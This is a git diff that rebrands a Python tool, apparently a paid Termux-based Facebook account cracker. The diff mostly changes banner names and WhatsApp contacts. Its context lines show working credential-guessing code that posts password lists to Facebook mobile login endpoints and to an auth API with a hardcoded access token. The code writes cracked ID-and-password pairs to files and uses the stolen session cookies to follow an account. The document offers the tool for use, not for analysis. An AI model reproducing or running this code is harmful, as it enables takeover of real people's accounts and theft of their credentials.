f381cc150d22ae5bbcd7a02e90c4bbb4d5ce404c
ARSHAD AHMED TOPU <134373949+ARSHAD-404-CYBER@users.noreply.github.com>
2023-07-17 19:50:58 +0600

    Update TRICKA4IF2.py

--- TRICKA4IF2.py
+++ TRICKA4IF2.py
@@ -309,7 +309,7 @@ def crack(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ BH➳TEAM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ TRICK A4IF ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -324,14 +324,14 @@ def crack(idf,pwv):
 			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				cp +=1
-				print( f'\r\x1b[1;91m [ BH➳TEAM-CP ] {idf} | {pw}')
+				print( f'\r\x1b[1;91m [ TRICK A4IF-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BH➳TEAM-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ TRICK A4IF-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
 				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
@@ -348,7 +348,7 @@ def free(idf,pwv):
 	bi = random.choice([u,k,kk,b,h,hh])
 	pers = loop*100/len(id2)
 	fff = '%'
-	sys.stdout.write('\r %s[ BH➳TEAM ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
+	sys.stdout.write('\r %s[ TRICK A4IF ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
 	sys.stdout.flush()
 	ua = random.choice(ugen)
 	ua2 = random.choice(ugen2)
@@ -362,17 +362,17 @@ def free(idf,pwv):
 			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
 			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
-				rint( f'\r\x1b[1;91m [ BH➳TEAM-CP ] {idf} | {pw}')
+				rint( f'\r\x1b[1;91m [ TRICK A4IF-CP ] {idf} | {pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 				akun.append(idf+'|'+pw)
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
 				coki=po.cookies.get_dict()
 				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r\x1b[1;92m [ BH➳TEAM-OK ] {idf} | {pw}')
+				print(f'\r\x1b[1;92m [ TRICK A4IF-OK ] {idf} | {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/BH➳TEAM-OK.txt','a').write('%s\n' % wrt)
+				open('/sdcard/TRICK A4IF-OK.txt','a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
 
@@ -388,23 +388,22 @@ def follow(ses,coki):
 	ses.get(('https://mbasic.facebook.com' + str(get)), cookies={'cookie': coki}).text
 
 logo = ("""
-\033[93;1m  ____        _    _   _______ ______          __  __ 
-\033[1;32m |  _ \      | |  | | |__   __|  ____|   /\   |  \/  |
-\033[91;1m | |_) |_____| |__| |    | |  | |__     /  \  | \  / |
-\033[95;1m |  _ <______|  __  |    | |  |  __|   / /\ \ | |\/| |
-\033[94;1m | |_) |     | |  | |    | |  | |____ / ____ \| |  | |
-\033[93;1m |____/      |_|  |_|    |_|  |______/_/    \_\_|  |_|          
- 
-
+\033[1;32m  _______ _____  _____ _____ _  __         _  _ _____ ______ 
+\033[91;1m |__   __|  __ \|_   _/ ____| |/ /     /\ | || |_   _|  ____|
+\033[95;1m    | |  | |__) | | || |    | ' /     /  \| || |_| | | |__   
+\033[94;1m    | |  |  _  /  | || |    |  <     / /\ \__   _| | |  __|  
+\033[93;1m    | |  | | \ \ _| || |____| . \   / ____ \ | |_| |_| |     
+\033[1;32m    |_|  |_|  \_\_____\_____|_|\_\ /_/    \_\|_|_____|_|     
+                                                                                                                          
 \x1b[1;90m════════════════════════════════════════════
 \x1b[1;90m════════════════════════════════════════════
            \x1b[1;92m╔═════════════════════════════╗
            \x1b[1;92m║ TOOL NAME : { FILE CLONE }   ║
-           \x1b[1;92m║ AUTHOR    : BD JAHIED     ║
-           \x1b[1;92m║ GITHUB        : BLACK-HUNTER-TEEM ║
-           \x1b[1;92m║ FACEBOOK  : JAHIED HUSAIN   ║
-           \x1b[1;92m║ GROUP          : BLACK HUNTER TEAM ║
-           \x1b[1;92m║ WHATSAPP  : +8801747951169       ║
+           \x1b[1;92m║ AUTHOR    : TRICK A4SHAD     ║
+           \x1b[1;92m║ GITHUB        : ARSHAD-404-CYBER ║
+           \x1b[1;92m║ FACEBOOK  : ARSHAD AHMED TOPU   ║
+           \x1b[1;92m║ GROUP          : TRICK A4IF ║
+           \x1b[1;92m║ WHATSAPP  :  +8801922532036     ║
            \x1b[1;92m╚═════════════════════════════╝
 \x1b[1;90m════════════════════════════════════════════
 \x1b[1;90m════════════════════════════════════════════""")
@@ -835,7 +834,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [ BH➳TEAM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [ TRICK A4IF ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -852,15 +851,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ TRICK A4IF-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-BH➳TEAM-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-TRICK A4IF-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ TRICK A4IF-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-BH➳TEAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-TRICK A4IF-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1262,7 +1261,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r [BH➳TEAM ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
+			"\r [TRICK A4IF ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -1279,15 +1278,15 @@ class Main:
 			}
 			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
 			if "session_key" in response.text and "EAAA" in response.text:
-				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ TRICK A4IF-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				print ("\r \033[0;92m Congrats Bro ")
 				self.ok.append("%s|%s"%(uid, pw))
-				open("2009-BH➳TEAM-OK.txt","a").write(" %s|%s\n"%(uid, pw))
+				open("2009-TRICK A4IF-OK.txt","a").write(" %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r \033[0;92m[ BH➳TEAM-OK ] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r \033[0;92m[ TRICK A4IF-OK ] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
-				open("2009-BH➳TEAM-OK.txt","a").write(" %s | %s\n"%(uid, pw))
+				open("2009-TRICK A4IF-OK.txt","a").write(" %s | %s\n"%(uid, pw))
 				break
 			else:
 				continue
@@ -1299,7 +1298,7 @@ def Subscraption():
 	key1=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
 	clear()
 	print(logo)
-	r1=requests.get("https://github.com/MR-RAHAD-511/Rabby/blob/main/Approval.txt").text
+	r1=requests.get("https://github.com/ARSHAD-404-CYBER/PAID.A4IF/blob/main/Approval%20text").text
 	if key1 in r1:
 		os.system('clear')
 		print(logo)
@@ -1312,7 +1311,7 @@ def Subscraption():
 		os.system("clear")
 		print(logo)
 		print ("")
-		print(" \033[1;32m FERDOUS Tool Paid You Need Get Approved First\033[1;37m\n")
+		print(" \033[1;32m   TRICK A4IF  Tool Paid You Need Get Approved First\033[1;37m\n")
 		print ("")
 		print(" Your Key is Not Approved ")
 		print("")
@@ -1325,6 +1324,6 @@ def Subscraption():
 		input(" Press Enter To Send Key Admin Whatsapp")
 		time.sleep(3.5)
 		tks = 'Dear%20Admin,%20Please%20Approved%20My%20Key%20To%20Premium%20%20Thanks%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20Name%20:%20'+name+'%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20My%20%20Key%20%20:%20'+ak+ahsan+''+key1
-		os.system('am start https://wa.me/+8801747951169?text=' + tks)
+		os.system('am start https://wa.me/+8801922532036?text=' + tks)
 		Subscraption()        
 Subscraption()
